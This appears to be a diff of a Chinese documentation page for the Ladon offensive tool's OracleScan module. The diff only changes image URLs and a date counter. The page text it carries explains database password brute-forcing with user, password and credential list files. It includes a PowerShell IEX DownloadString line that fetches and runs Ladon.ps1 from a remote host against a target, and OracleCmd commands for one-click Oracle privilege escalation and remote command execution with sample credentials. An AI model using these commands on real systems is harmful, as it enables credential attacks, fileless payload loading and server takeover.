@@ -198,7 +198,7 @@
         
         <p class="fa fa-exclamation-triangle warning">
             本文于<strong>
-                464</strong>
+                471</strong>
             天之前发表
         </p>
         
@@ -222,7 +222,7 @@ window.location.href="https://k8gege.org/Ladon/OracleScan.html";
 <p>PS：SQL Server不指定数据库名也可以连 权限不够最多读取不了对应库的数据而已<br>但是填写默认的master库，即使是最低权限，也可连接上，就可用来验证爆破密码<br>而Oracle不行，填写默认的orcl，非授权用户是连不上的 不指定时Ladon默认跑orcl</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/24 OracleScan</span><br></pre></td></tr></table></figure>
 
-<p><img alt="image" data-original="https://k8gege.org/k8img/Ladon/OracleScan_up.png"></p>
+<p><img alt="image" data-original="/k8img/Ladon/OracleScan_up.png"></p>
 <h4 id="配置密码爆破参数"><a href="#配置密码爆破参数" class="headerlink" title="配置密码爆破参数"></a>配置密码爆破参数</h4><p>1  支持标准的user.txt和pass.txt帐密破解，爆破每个用户都需将密码跑完或跑出正确为此<br>2  支持userpass.txt（存放用户名和对应密码）,用于快速验证其它机器是否存在相同帐密<br>3  支持check.txt（存放IP/端口/库名/用户/密码）,不指定端口和数据库名则使用默认<br>4  Oracle数据库，需要放个sid.txt里面存放数据库名称，Ladon先检测数据库存在才爆破</p>
 <p>user.txt和pass.txt分别存放用户、密码<br>userpass.txt存放用户密码组，即每行存放用户以及密码<br>check.txt每行存放IP\端口\用户\密码</p>
 <h4 id="数据库口令检测"><a href="#数据库口令检测" class="headerlink" title="数据库口令检测"></a>数据库口令检测</h4><p>数据库与其它密码爆破不同，有时数据库做了权限，指定用户只能连指定库，连默认库肯定不行</p>
@@ -230,13 +230,13 @@ window.location.href="https://k8gege.org/Ladon/OracleScan.html";
 <h5 id="oracle同理"><a href="#oracle同理" class="headerlink" title="oracle同理"></a>oracle同理</h5><p>192.168.1.8 1521 orcl system k8gege<br>192.168.1.8 orcl system k8gege<br>192.168.1.8 system k8gege<br>命令: Ladon OracleScan</p>
 <h5 id="mysql无需指定数据库名"><a href="#mysql无需指定数据库名" class="headerlink" title="mysql无需指定数据库名"></a>mysql无需指定数据库名</h5><p>192.168.1.8 3306 root k8gege<br>192.168.1.8 root k8gege<br>命令: Ladon MysqlScan</p>
 <h3 id="PowerLadon"><a href="#PowerLadon" class="headerlink" title="PowerLadon"></a>PowerLadon</h3><h4 id="远程加载OracleScan-1521端口弱口令爆破"><a href="#远程加载OracleScan-1521端口弱口令爆破" class="headerlink" title="远程加载OracleScan 1521端口弱口令爆破"></a>远程加载OracleScan 1521端口弱口令爆破</h4><p>powershell “IEX (New-Object Net.WebClient).DownloadString(‘<a href="http://192.168.1.3:800/Ladon.ps1&#39;" target="_blank" rel="noopener">http://192.168.1.3:800/Ladon.ps1&#39;</a>); Ladon 192.168.1.141 OracleScan”</p>
-<h3 id="Kali、Linux、Mac、路由器等操作系统"><a href="#Kali、Linux、Mac、路由器等操作系统" class="headerlink" title="Kali、Linux、Mac、路由器等操作系统"></a>Kali、Linux、Mac、路由器等操作系统</h3><p>./Ladon 192.168.1.8/24 OracleScan<br><img alt="image" data-original="https://k8gege.org/k8img/Ladon/OracleScan_up.png"></p>
+<h3 id="Kali、Linux、Mac、路由器等操作系统"><a href="#Kali、Linux、Mac、路由器等操作系统" class="headerlink" title="Kali、Linux、Mac、路由器等操作系统"></a>Kali、Linux、Mac、路由器等操作系统</h3><p>./Ladon 192.168.1.8/24 OracleScan<br><img alt="image" data-original="/k8img/Ladon/OracleScan_up.png"></p>
 <h3 id="Oracle数据库远程提权工具"><a href="#Oracle数据库远程提权工具" class="headerlink" title="Oracle数据库远程提权工具"></a>Oracle数据库远程提权工具</h3><p>12.15<br>[+]OracleCmd2    Oracle数据库远程提权工具2 官方驱动&gt;=net 4.8 大小4.9M不内置</p>
 <p>Ladon 12.2  12.14<br>[+]OracleCmd    Oracle数据库远程提权工具 3种方法一键提权<br>                支持Windows/Linux/MacOS等服务器操作系统<br>                支持高版本Oracle 12G、11G、12G及之前版本</p>
-<p>GUI版 填写用户密码 Oracle一键提权远程执行命令<br><img alt="image" data-original="https://k8gege.org/k8img/Ladon/OracleStudy.png"></p>
+<p>GUI版 填写用户密码 Oracle一键提权远程执行命令<br><img alt="image" data-original="/k8img/Ladon/OracleStudy.png"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon OracleCmd 192.168.50.18 1521 orcl admin K8gege520 m3 whoami</span><br><span class="line">Ladon OracleCmd 192.168.50.18 1521 orcl admin K8gege520 m2 whoami</span><br><span class="line">Ladon OracleCmd 192.168.50.18 1521 orcl admin K8gege520 m1 whoami</span><br><span class="line"></span><br><span class="line">Ladon OracleCmd2 192.168.50.18 1521 orcl admin K8gege520 whoami</span><br></pre></td></tr></table></figure>
-<p><img alt="image" data-original="https://k8gege.org/k8img/Ladon/OracleCmd.png"></p>
-<p><img alt="image" data-original="https://k8gege.org/k8img/Ladon/OracleCmd2.png"></p>
+<p><img alt="image" data-original="/k8img/Ladon/OracleCmd.png"></p>
+<p><img alt="image" data-original="/k8img/Ladon/OracleCmd2.png"></p>
 <h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>
 <div style="text-align: center; width: 710px; border: green solid 0px;">
 <img alt style="display: inline-block;width: 250px;height: 300px;" data-original="https://k8gege.org/img/k8team.jpg">
